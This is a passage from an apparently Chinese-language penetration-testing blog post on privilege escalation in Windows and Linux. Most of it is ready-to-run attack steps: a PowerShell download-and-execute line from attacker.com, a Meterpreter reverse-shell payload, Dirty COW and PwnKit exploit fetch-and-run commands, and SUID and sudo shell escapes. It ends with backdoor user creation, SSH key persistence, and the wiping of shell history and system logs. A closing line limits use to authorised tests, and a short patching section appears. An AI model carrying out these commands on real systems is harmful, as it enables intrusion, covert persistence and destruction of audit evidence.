+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取 OS Shell</span></span><br><span class="line">sqlmap -d <span class="string">&quot;mysql://root:root@192.168.1.27:3306/mysql&quot;</span> --os-shell -v 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行单条命令</span></span><br><span class="line">sqlmap -d <span class="string">&quot;mysql://root:root@192.168.1.27:3306/mysql&quot;</span> --os-cmd=<span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>执行流程</strong>：</p>
+<ol>
+<li>sqlmap 自动检测 MySQL 版本和权限</li>
+<li>上传对应平台的 UDF 库到 plugin 目录</li>
+<li>创建 <code>sys_exec</code> 和 <code>sys_eval</code> 函数</li>
+<li>提供交互式 Shell 或执行指定命令</li>
+</ol>
+<hr>
+<h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><h3 id="Windows-内核提权"><a href="#Windows-内核提权" class="headerlink" title="Windows 内核提权"></a>Windows 内核提权</h3><h4 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p><strong>1. 收集系统信息</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 使用自动化工具扫描可利用漏洞</strong>：</p>
+<p><strong>推荐工具</strong>：</p>
+<ul>
+<li><strong>WinPEAS</strong>：<a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/releases">https://github.com/peass-ng/PEASS-ng/releases</a></li>
+<li><strong>Windows Exploit Suggester</strong>：<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
+<li><strong>Sherlock</strong>：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></li>
+</ul>
+<p><strong>WinPEAS 使用示例</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 下载并执行</span><br><span class="line">powershell -ep bypass -c &quot;IEX(New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://attacker.com/winPEAS.ps1&#x27;)&quot;</span><br><span class="line"></span><br><span class="line"># 或直接运行 EXE 版本</span><br><span class="line">winPEASx64.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Checking Windows version</span><br><span class="line">    [i] Windows 10 Pro Build 18362</span><br><span class="line">    [!] Vulnerable to CVE-2019-1388 (UAC Bypass)</span><br><span class="line">    [!] Vulnerable to CVE-2020-0787 (BITS Privilege Escalation)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="常见内核漏洞"><a href="#常见内核漏洞" class="headerlink" title="常见内核漏洞"></a>常见内核漏洞</h4><table>
+<thead>
+<tr>
+<th>CVE 编号</th>
+<th>影响系统</th>
+<th>漏洞类型</th>
+<th>利用难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE-2021-1732</td>
+<td>Windows 10 1809-20H2</td>
+<td>内核提权</td>
+<td>中</td>
+</tr>
+<tr>
+<td>CVE-2020-0787</td>
+<td>Windows 7&#x2F;8&#x2F;10&#x2F;Server 2008-2019</td>
+<td>BITS 提权</td>
+<td>低</td>
+</tr>
+<tr>
+<td>CVE-2019-1388</td>
+<td>Windows 7&#x2F;8&#x2F;10&#x2F;Server 2008-2019</td>
+<td>UAC 绕过</td>
+<td>低</td>
+</tr>
+<tr>
+<td>CVE-2018-8120</td>
+<td>Windows 7&#x2F;Server 2008 R2</td>
+<td>内核提权</td>
+<td>中</td>
+</tr>
+<tr>
+<td>MS16-032</td>
+<td>Windows 7&#x2F;8&#x2F;10&#x2F;Server 2008-2016</td>
+<td>内核提权</td>
+<td>低</td>
+</tr>
+<tr>
+<td>MS15-051</td>
+<td>Windows 2003&#x2F;Vista&#x2F;7&#x2F;8&#x2F;Server 2008-2012</td>
+<td>内核提权</td>
+<td>低</td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="Metasploit-利用"><a href="#Metasploit-利用" class="headerlink" title="Metasploit 利用"></a>Metasploit 利用</h4><p><strong>1. 生成 Meterpreter Payload</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 获取 Meterpreter 会话后，使用 local_exploit_suggester</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.100</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取会话后</span></span><br><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 根据建议使用对应的提权模块</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例：使用 MS16-032 提权</span></span><br><span class="line">use exploit/windows/local/ms16_032_secondary_logon_handle_privesc</span><br><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.100</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Linux-提权技术"><a href="#Linux-提权技术" class="headerlink" title="Linux 提权技术"></a>Linux 提权技术</h1><p>Linux 系统的提权通常利用内核漏洞、错误配置的 SUID&#x2F;SUDO 权限、或服务滥用。</p>
+<hr>
+<h2 id="内核漏洞提权-1"><a href="#内核漏洞提权-1" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><h3 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p><strong>1. 收集系统信息</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a                <span class="comment"># 内核版本</span></span><br><span class="line"><span class="built_in">cat</span> /etc/issue          <span class="comment"># 发行版信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*-release      <span class="comment"># 详细版本信息</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 使用自动化工具扫描</strong>：</p>
+<p><strong>推荐工具</strong>：</p>
+<ul>
+<li><strong>LinPEAS</strong>：<a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/releases">https://github.com/peass-ng/PEASS-ng/releases</a></li>
+<li><strong>Linux Exploit Suggester</strong>：<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
+<li><strong>Traitor</strong>：<a target="_blank" rel="noopener" href="https://github.com/liamg/traitor/releases">https://github.com/liamg/traitor/releases</a></li>
+</ul>
+<p><strong>LinPEAS 使用示例</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载并执行</span></span><br><span class="line">curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或上传后执行</span></span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>Linux Exploit Suggester 使用示例</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span><br><span class="line"><span class="built_in">chmod</span> +x linux-exploit-suggester.sh</span><br><span class="line">./linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="常见内核漏洞-1"><a href="#常见内核漏洞-1" class="headerlink" title="常见内核漏洞"></a>常见内核漏洞</h3><table>
+<thead>
+<tr>
+<th>漏洞名称</th>
+<th>CVE 编号</th>
+<th>影响内核版本</th>
+<th>利用难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Dirty Pipe</strong></td>
+<td>CVE-2022-0847</td>
+<td>5.8 - 5.16.11</td>
+<td>低</td>
+</tr>
+<tr>
+<td><strong>Dirty COW</strong></td>
+<td>CVE-2016-5195</td>
+<td>2.6.22 - 4.8.3</td>
+<td>低</td>
+</tr>
+<tr>
+<td><strong>PwnKit</strong></td>
+<td>CVE-2021-4034</td>
+<td>所有版本（polkit 漏洞）</td>
+<td>低</td>
+</tr>
+<tr>
+<td><strong>Baron Samedit</strong></td>
+<td>CVE-2021-3156</td>
+<td>sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1</td>
+<td>中</td>
+</tr>
+<tr>
+<td><strong>Dirty Cred</strong></td>
+<td>CVE-2022-2588</td>
+<td>5.8 - 5.19</td>
+<td>中</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="Dirty-COW-提权示例"><a href="#Dirty-COW-提权示例" class="headerlink" title="Dirty COW 提权示例"></a>Dirty COW 提权示例</h3><p><strong>漏洞原理</strong>：利用 Linux 内核的写时复制（Copy-On-Write）机制的竞态条件，修改只读文件。</p>
+<p><strong>利用步骤</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 Exploit</span></span><br><span class="line">wget https://github.com/FireFart/dirtycow/raw/master/dirty.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行（会创建一个新的 root 用户 firefart）</span></span><br><span class="line">./dirty</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用新密码登录</span></span><br><span class="line">su firefart</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SUID（Set User ID）是 Linux 的一种特殊权限，允许用户以文件所有者的权限执行该文件。如果一个 root 拥有的程序设置了 SUID 位，普通用户执行时会以 root 权限运行。</p>
+<h3 id="查找-SUID-文件"><a href="#查找-SUID-文件" class="headerlink" title="查找 SUID 文件"></a>查找 SUID 文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找所有 SUID 文件</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 root 拥有的 SUID 文件</span></span><br><span class="line">find / -uid 0 -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细列出 SUID 文件</span></span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="常见可利用的-SUID-程序"><a href="#常见可利用的-SUID-程序" class="headerlink" title="常见可利用的 SUID 程序"></a>常见可利用的 SUID 程序</h3><table>
+<thead>
+<tr>
+<th>程序</th>
+<th>提权方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>nmap</strong></td>
+<td><code>nmap --interactive</code> -&gt; <code>!sh</code></td>
+</tr>
+<tr>
+<td><strong>vim</strong></td>
+<td><code>vim -c &#39;:!/bin/sh&#39;</code> 或 <code>vim /etc/shadow</code></td>
+</tr>
+<tr>
+<td><strong>find</strong></td>
+<td><code>find / -exec /bin/sh \;</code></td>
+</tr>
+<tr>
+<td><strong>bash</strong></td>
+<td><code>bash -p</code></td>
+</tr>
+<tr>
+<td><strong>more&#x2F;less</strong></td>
+<td><code>more /etc/passwd</code> -&gt; <code>!/bin/sh</code></td>
+</tr>
+<tr>
+<td><strong>nano</strong></td>
+<td><code>nano</code> -&gt; Ctrl+R -&gt; Ctrl+X -&gt; <code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></td>
+</tr>
+<tr>
+<td><strong>cp</strong></td>
+<td>覆盖 <code>/etc/passwd</code> 或 <code>/etc/shadow</code></td>
+</tr>
+<tr>
+<td><strong>awk</strong></td>
+<td><code>awk &#39;BEGIN{system(&quot;/bin/sh&quot;)}&#39;</code></td>
+</tr>
+<tr>
+<td><strong>python</strong></td>
+<td><code>python -c &#39;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39;</code></td>
+</tr>
+<tr>
+<td><strong>perl</strong></td>
+<td><code>perl -e &#39;exec &quot;/bin/sh&quot;;&#39;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="实战示例"><a href="#实战示例" class="headerlink" title="实战示例"></a>实战示例</h3><p><strong>find 提权</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前用户</span></span><br><span class="line">find /etc/passwd -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 root Shell</span></span><br><span class="line">find /etc/passwd -<span class="built_in">exec</span> /bin/sh \;</span><br></pre></td></tr></table></figure>
+
+<p><strong>vim 提权</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接编辑 shadow 文件</span></span><br><span class="line">vim /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或通过 vim 命令模式执行 Shell</span></span><br><span class="line">vim -c <span class="string">&#x27;:!/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>awk 提权</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SUDO-提权"><a href="#SUDO-提权" class="headerlink" title="SUDO 提权"></a>SUDO 提权</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><code>sudo</code> 允许普通用户以 root 权限执行特定命令。如果配置不当，攻击者可以利用 sudo 权限提升至 root。</p>
+<h3 id="检查-sudo-权限"><a href="#检查-sudo-权限" class="headerlink" title="检查 sudo 权限"></a>检查 sudo 权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User user may run the following commands on target:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/find</span><br></pre></td></tr></table></figure>
+
+<p>这表示当前用户可以无密码以 root 权限执行 <code>find</code> 命令。</p>
+<hr>
+<h3 id="常见-sudo-提权方法"><a href="#常见-sudo-提权方法" class="headerlink" title="常见 sudo 提权方法"></a>常见 sudo 提权方法</h3><p><strong>find 提权</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> find /etc/passwd -<span class="built_in">exec</span> /bin/sh \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/tq/4.webp" loading='lazy'><br><img src="/2026/02/13/tq/5.webp" loading='lazy'><br><img src="/2026/02/13/tq/6.webp" loading='lazy'><br><img src="/2026/02/13/tq/7.webp" loading='lazy'></p>
+<p><strong>vim 提权</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim -c <span class="string">&#x27;:!/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>python 提权</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python -c <span class="string">&#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>less 提权</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> less /etc/passwd</span><br><span class="line"><span class="comment"># 在 less 中输入 !sh</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>nmap 提权</strong>（旧版本）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="GTFOBins-资源"><a href="#GTFOBins-资源" class="headerlink" title="GTFOBins 资源"></a>GTFOBins 资源</h3><p><strong>网站</strong>：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p>GTFOBins 是一个收集了大量可用于提权的 Unix 二进制文件的数据库，包括 SUID、SUDO、环境变量等利用方法。</p>
+<hr>
+<h2 id="Polkit-提权（PwnKit）"><a href="#Polkit-提权（PwnKit）" class="headerlink" title="Polkit 提权（PwnKit）"></a>Polkit 提权（PwnKit）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p><strong>CVE-2021-4034</strong>（PwnKit）是 polkit 的 pkexec 组件中的内存损坏漏洞，允许任何本地用户获得 root 权限。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CentOS 6 &lt; polkit-0.96-11.el6_10.2</span><br><span class="line">CentOS 7 &lt; polkit-0.112-26.el7_9.1</span><br><span class="line">CentOS 8.0 &lt; polkit-0.115-13.el8_5.1</span><br><span class="line">CentOS 8.2 &lt; polkit-0.115-11.el8_2.2</span><br><span class="line">CentOS 8.4 &lt; polkit-0.115-11.el8_4.2</span><br><span class="line"></span><br><span class="line">Ubuntu 21.10 &lt; 0.105-31ubuntu0.1</span><br><span class="line">Ubuntu 21.04 (已停止支持)</span><br><span class="line">Ubuntu 20.04 LTS &lt; 0.105-26ubuntu1.2</span><br><span class="line">Ubuntu 18.04 LTS &lt; 0.105-20ubuntu0.18.04.6</span><br><span class="line">Ubuntu 16.04 ESM &lt; 0.105-14.1ubuntu0.5+esm1</span><br><span class="line">Ubuntu 14.04 ESM &lt; 0.105-4ubuntu3.14.04.6+esm1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><p><strong>1. 下载 Exploit</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1：使用预编译版本</span></span><br><span class="line">wget https://github.com/ly4k/PwnKit/releases/download/v1.0/PwnKit</span><br><span class="line"><span class="built_in">chmod</span> +x PwnKit</span><br><span class="line">./PwnKit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：使用需要编译的版本</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/dzonerzy/poc-cve-2021-4034.git</span><br><span class="line"><span class="built_in">cd</span> poc-cve-2021-4034</span><br><span class="line">make</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 执行提权</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./PwnKit</span><br><span class="line"><span class="comment"># 成功后直接获得 root Shell</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h3><p><strong>检测是否受影响</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查 polkit 版本</span></span><br><span class="line">pkexec --version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否存在漏洞</span></span><br><span class="line"><span class="built_in">ls</span> -la /usr/bin/pkexec</span><br></pre></td></tr></table></figure>
+
+<p><strong>修复方法</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Debian/Ubuntu</span></span><br><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade policykit-1</span><br><span class="line"></span><br><span class="line"><span class="comment"># CentOS/RHEL</span></span><br><span class="line"><span class="built_in">sudo</span> yum update polkit</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="提权后操作"><a href="#提权后操作" class="headerlink" title="提权后操作"></a>提权后操作</h1><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><strong>添加后门用户</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">useradd -m -s /bin/bash backdoor</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;backdoor:P@ssw0rd&#x27;</span> | chpasswd</span><br><span class="line">usermod -aG <span class="built_in">sudo</span> backdoor</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">net user backdoor P@ssw0rd /add</span><br><span class="line">net localgroup administrators backdoor /add</span><br></pre></td></tr></table></figure>
+
+<p><strong>SSH 密钥持久化</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...&quot;</span> &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 600 /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><p><strong>清理命令历史</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line"><span class="built_in">history</span> -c</span><br><span class="line"><span class="built_in">rm</span> -f ~/.bash_history</span><br><span class="line"><span class="built_in">ln</span> -s /dev/null ~/.bash_history</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">Clear-History</span><br></pre></td></tr></table></figure>
+
+<p><strong>清理日志</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; /var/log/auth.log</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">wevtutil cl System</span><br><span class="line">wevtutil cl Security</span><br><span class="line">wevtutil cl Application</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>提权是内网渗透的关键环节，成功的提权依赖于：</p>
+<ol>
+<li><strong>信息收集</strong>：全面收集系统信息、权限配置、运行服务</li>
+<li><strong>漏洞识别</strong>：使用自动化工具快速定位可利用的提权路径</li>
+<li><strong>灵活利用</strong>：根据目标环境选择合适的提权技术</li>
+<li><strong>权限维持</strong>：提权后及时建立持久化机制</li>
+<li><strong>痕迹清理</strong>：清理日志和命令历史，降低被发现风险</li>
+</ol>
+<p>记住：提权技术需要在授权的渗透测试环境中使用，未经授权的提权行为属于违法行为。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Linux%E6%8F%90%E6%9D%83/">Linux提权</a><a class="post-meta__tags" href="/tags/Windows%E6%8F%90%E6%9D%83/">Windows提权</a><a class="post-meta__tags" href="/tags/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">内核漏洞提权</a><a class="post-meta__tags" href="/tags/SUID%E6%8F%90%E6%9D%83/">SUID提权</a><a class="post-meta__tags" href="/tags/SUDO%E6%8F%90%E6%9D%83/">SUDO提权</a><a class="post-meta__tags" href="/tags/PKEXEC%E6%8F%90%E6%9D%83/">PKEXEC提权</a><a class="post-meta__tags" href="/tags/MYSQL%E6%8F%90%E6%9D%83/">MYSQL提权</a><a class="post-meta__tags" href="/tags/MSSQL%E6%8F%90%E6%9D%83/">MSSQL提权</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/13/wc/" title="Windows/Linux 权限维持技术"><img class="cover" src="/img/covers/shinchan-cover-05.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Windows/Linux 权限维持技术</div></div><div class="info-2"><div class="info-item-1">Windows 权限维持在获取目标系统的初始访问权限后，权限维持是确保长期控制的关键环节。通过部署持久化机制，可以在系统重启、用户注销、甚至部分安全检测后依然保持访问能力。  计划任务持久化原理计划任务（Scheduled Tasks）是 Windows 系统的合法功能，允许在特定时间或事件触发时自动执行程序。通过创建以 SYSTEM 权限运行的计划任务，可以实现高权限的持久化控制。 基础利用创建每日执行的计划任务： 1schtasks /create /s 192.168.3.144 /ru system /u dbadmin /p admin!@#45 /tn transfer /sc DAILY /tr c:\transfer.exe /f  参数说明：  /s：目标主机 IP（本地执行可省略） /ru：运行权限（system 